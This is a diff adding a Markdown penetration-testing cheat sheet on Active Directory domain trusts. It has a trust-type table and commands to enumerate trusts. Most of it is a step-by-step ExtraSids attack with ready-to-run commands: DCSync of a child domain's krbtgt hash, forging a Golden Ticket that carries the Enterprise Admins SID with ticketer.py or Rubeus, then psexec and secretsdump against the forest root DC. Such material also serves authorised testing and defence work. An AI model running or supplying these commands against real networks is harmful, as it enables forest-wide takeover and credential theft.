@@ -1,0 +1,98 @@
+# Domain Trusts
+
+Domain trusts allow users in one domain to authenticate to resources in another. Misconfigured or predictable trust relationships are a path from a compromised child domain to the parent: or from one forest to another.
+
+## Trust Types
+
+| Type | Direction | Transitive | Notes |
+|------|-----------|------------|-------|
+| Parent-child | Bidirectional | Yes | Automatic within a forest: child domain trusts parent implicitly |
+| Tree-root | Bidirectional | Yes | Between forest root and tree root domains |
+| Cross-forest | One or two-way | Yes (within forest) | Requires explicit setup between forests |
+| External | One or two-way | No | Non-transitive trust to a domain in another forest |
+| Shortcut | One or two-way | Yes | Manual trust to speed up auth across distant domains in same forest |
+
+## Enumerating Trusts
+
+Map trust relationships before attempting cross-domain attacks: bidirectional transitive trusts are the most exploitable.
+
+```powershell
+# PowerView
+Get-DomainTrust
+Get-ForestTrust
+Get-DomainTrust -Domain $DOMAIN | Select-Object SourceName, TargetName, TrustDirection, TrustType
+
+# Built-in
+nltest /domain_trusts
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+```
+
+```bash
+# impacket
+lookupsid.py $DOMAIN/$USER:$PASSWORD@$DC_IP
+
+# nxc
+nxc smb $IP -u $USER -p $PASSWORD -M enum_trusts
+```
+
+## ExtraSids Attack (Child → Parent Domain Escalation)
+
+Within a forest, all domains share the same Schema and Enterprise Admins group (which lives in the forest root). If you compromise a child domain's `krbtgt` account, you can forge a Golden Ticket with the `Enterprise Admins` SID (S-1-5-21-`<root_domain_sid>`-519) injected into the `ExtraSids` field: the forest root DC will honour it.
+
+**Why it works:** Kerberos PAC validation checks the SID history and ExtraSids fields. Adding the Enterprise Admins SID to ExtraSids makes the forged TGT equivalent to a forest root Domain Admin.
+
+```bash
+# Step 1: Get child domain krbtgt hash (via DCSync from compromised child DC)
+secretsdump.py child.$DOMAIN/administrator:$PASSWORD@$DC_IP -just-dc-user krbtgt
+
+# Step 2: Get child domain SID
+lookupsid.py child.$DOMAIN/$USER:$PASSWORD@$DC_IP | grep "Domain SID"
+
+# Step 3: Get parent (forest root) domain SID
+lookupsid.py $DOMAIN/$USER:$PASSWORD@$DC_IP | grep "Domain SID"
+# Enterprise Admins SID = <parent_domain_SID>-519
+```
+
+```bash
+# Step 4: Forge Golden Ticket with Enterprise Admins SID in ExtraSids
+ticketer.py \
+  -nthash $HASH \
+  -domain-sid <child_domain_sid> \
+  -domain child.$DOMAIN \
+  -extra-sid <parent_domain_sid>-519 \
+  Administrator
+
+export KRB5CCNAME=Administrator.ccache
+```
+
+```bash
+# Step 5: Access parent domain resources
+psexec.py -k -no-pass $DOMAIN/Administrator@parent-dc.$DOMAIN
+secretsdump.py -k -no-pass $DOMAIN/Administrator@parent-dc.$DOMAIN
+```
+
+```powershell
+# Rubeus: forge ticket on Windows
+Rubeus.exe golden \
+  /user:Administrator \
+  /domain:child.$DOMAIN \
+  /sid:<child_domain_sid> \
+  /krbtgt:$HASH \
+  /sids:<parent_domain_sid>-519 \
+  /ptt
+```
+
+## Foreign Group Membership
+
+In external trusts, check if any accounts from the trusted domain are members of local groups: a common misconfiguration that grants unexpected access.
+
+```powershell
+# Find users from foreign domains in local groups
+Get-DomainForeignGroupMember
+Get-DomainForeignUser
+```
+
+```bash
+# bloodyAD
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get object "Domain Users" --attr member
+```
